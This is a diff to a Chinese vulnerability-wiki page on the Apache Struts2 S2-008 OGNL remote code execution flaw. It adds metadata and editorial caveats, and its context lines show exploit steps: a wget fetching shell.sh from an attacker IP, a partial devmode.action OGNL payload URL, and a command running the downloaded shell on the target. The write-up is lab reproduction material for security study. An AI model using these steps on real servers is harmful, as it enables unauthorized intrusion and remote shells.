@@ -1,8 +1,53 @@
 ---
 source: "Threekiii/Vulnerability-Wiki"
+title: "Apache Struts2 S2-008 远程代码执行漏洞"
+product: "Apache Struts2开发调试接口"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "S2-008"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "2.1.0–2.3.1声称范围；devMode开启，调试接口可达，Linux命令条件；Cookie拦截器为另一个未复现入口"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-b995e36d06f128bbd2a7df7a"
+entity_id: "ve-b995e36d06f128bbd2a7df7a"
+schema_version: "1"
 ---
 
 # Apache Struts2 S2-008 远程代码执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：2.1.0–2.3.1声称范围；devMode开启，调试接口可达，Linux命令条件；Cookie拦截器为另一个未复现入口
+- 证据范围：明确多问题但实际只演示debug=command；不得把cookie配置风险和该演示当相同技术路径。
+
+### 本次正文校订
+
+- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 生产几乎不可能/鸡肋是无依据风险判断，改为非默认配置条件
+- Mac calculator与Linux容器示例混用须注明平台
+- 缺各子问题CVE映射/修复，尤其关闭devMode这一直接缓解
+- 已有入侵后安装后门的假设不是漏洞触发必要条件，应删离题推测
+- 下载shell副作用和完整请求配置缺失
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -21,7 +66,7 @@ S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式
 
 Vulhub 执行以下命令启动 s2-008 测试环境：
 
-```
+```shell
 docker-compose build
 docker-compose up -d
 ```
@@ -45,7 +90,7 @@ python3环境下：python -m http.server 80
 
 上传 shell.sh 文件的命令为：
 
-```
+```shell
 wget 192.168.174.128/shell.sh
 ```
 
@@ -57,7 +102,7 @@ http://your-ip:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAc
 
 执行 shell.sh 文件的命令为：
 
-```
+```shell
 bash /usr/local/tomcat/shell.sh
 ```
 
